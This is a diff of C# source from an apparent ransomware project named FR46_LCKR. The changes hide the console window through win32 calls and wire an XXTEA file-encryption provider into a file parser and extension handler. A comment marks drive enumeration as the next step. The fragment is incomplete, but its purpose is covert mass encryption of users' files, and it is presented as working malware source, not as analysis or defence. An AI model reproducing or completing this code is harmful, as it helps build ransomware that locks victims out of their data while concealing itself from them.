@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using FR46_LCKR.CLASS;
 using FR46_LCKR.Interface;
 using System.Collections.Generic;
@@ -16,9 +17,13 @@ namespace FR46_LCKR
 
         // Hide command shell while invoking win32 API
 
-        public class DParser
+        public class DummyParser : IFil_Parsr
         {
-            // Filler stuff for Parser
+            public void Par_File(string fPath)
+            {
+                System.Threading.Thread.Sleep(1);
+                Console.WriteLine("Parsing Files");
+            }
         }
         
         /*
@@ -33,9 +38,14 @@ namespace FR46_LCKR
             var hand = g_CMD();
             //Hide shell
             S_window(hand, sw_hde);
-            //Stopped here
 
-            IFil_Crypt: fil_Cr
+            IFil_Crypt fil_Crypt = new xXteaE_Provider();
+            IFil_Parsr fil_Parsr = new Fil_Parsr(fil_Crypt);
+            //Dummy Parser Function
+            // IFil_Parsr fil_Parser = new DummyParser();
+            IFil_ext fext = new Fil_ext();
+
+            //line 41 Go into Drv_Enum
         }
     }
 }
